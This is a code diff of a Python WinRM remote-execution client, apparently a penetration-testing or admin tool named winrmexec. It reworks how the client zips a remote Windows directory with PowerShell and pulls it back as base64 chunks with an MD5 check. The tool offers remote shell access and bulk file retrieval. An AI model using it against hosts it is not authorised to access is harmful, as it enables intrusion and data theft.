             tmpnm = randbytes(8).hex()
             tmpfn = tmpdir + tmpnm
             ps = f"""
-                New-Item -Path "{tmpdir}" -ItemType Directory -Name "{tmpnm}" | Out-Null
-                Get-ChildItem -Force -Recurse -Path "{src}" | ForEach-Object {{
+                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+                New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
+                Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
                     if(-not ($_.FullName -Like "*{tmpnm}*")) {{
                         try {{
-                            $dst = $_.FullName.Replace((Resolve-Path "{src}"), "")
+                            $dst = $_.FullName.Replace('{src}', '')
                             Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$dst"
                         }} catch {{
                             Write-Warning "skipping $dst"
                         }}
                     }}
                 }}
-                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-                Add-Type 'public class PFix:System.Text.UTF8Encoding{{public override byte[]GetBytes(string s){{s=s.Replace("\\\\", "/");return base.GetBytes(s);}}}}'
-                [System.IO.Compression.ZipFile]::CreateFromDirectory("{tmpfn}", "{tmpfn}.zip", [System.IO.Compression.CompressionLevel]::Fastest, $true, $(New-Object PFix))
-                Remove-Item -Recurse -Force -Path "{tmpfn}"
+                {path_fix_cs}
+                [IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip', [IO.Compression.CompressionLevel]::Fastest, $true, $(New-Object {_ns}.PathFix))
+                Remove-Item -Recurse -Force -Path '{tmpfn}'
             """
 
-            self.run_with_interrupt(runspace, ps, self.fancy_output)
+            self.run_with_interrupt(runspace, ps, self.write_line)
             src = tmpfn + ".zip"
 
         ps = f"""function Download-Remote {{
-            $h = Get-FileHash "{src}" -Algorithm MD5 | Select -Expand Hash;
-            $f = [System.IO.File]::OpenRead("{src}");
+            $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
+            $f = [System.IO.File]::OpenRead('{src}');
             $b = New-Object byte[] 65536;
             while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
             $f.Close();
-            [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($h));
+            [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
             }}
             Download-Remote
             Remove-Item Function:Download-Remote
         """
 
-        logging.info(f"downloading {src}")
+        self.write_info(f"downloading {src}")
         def collect(buf, out):
             if part := out.get("stdout"):
                 buf += b64decode(part)
-                print(f"[*] progress: {len(buf)} bytes", end='\r', flush=True)
+                self.write_progress(f"progress: {len(buf)} bytes")
 
         buf = bytearray()
         self.run_with_interrupt(runspace, ps, lambda out: collect(buf, out))
 
         if src_is_dir:
-            self.run_sync(runspace, f'Remove-Item -fo "{src}"') # remove the zip
+            self.run_sync(runspace, f"Remove-Item -fo '{src}'") # remove the zip too
 
         if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
-            logging.error("Corrupted download or file access error")
+            self.write_error("Corrupted download or file access error")
             return
 
-        logging.info(f"done, writing to {dst.resolve()}")
+        self.write_info(f"done, writing to {dst.resolve()}")
         try:
             with open(dst, "wb") as f:
                 f.write(buf[:-32])
         except IOError as e:
-            logging.error(str(e))
+            self.write_error(str(e))
 
 
 def main():
@@ -1372,9 +1555,6 @@ Same as for NTLM except hashes are not supported:
     parser.add_argument("-log", action="store_true",
         help="Will log all stdout to 'winrmexec_[timestamp]_stdout.log")
 
-    parser.add_argument("-history", action="store_true",
-        help="Saves prompt inpputs to $CWD/.winrmexec_history")
-
     args = parser.parse_args()
 
     if args.examples:
@@ -1427,7 +1607,7 @@ Same as for NTLM except hashes are not supported:
             exit()
         if not args.spn:
             try:
-                ipaddress.ip_address(targetName)
+                ip_address(targetName)
                 logging.error(f"when using kerberos and '-spn' is not specified, 'targetName' must be FQDN")
                 exit()
             except ValueError:
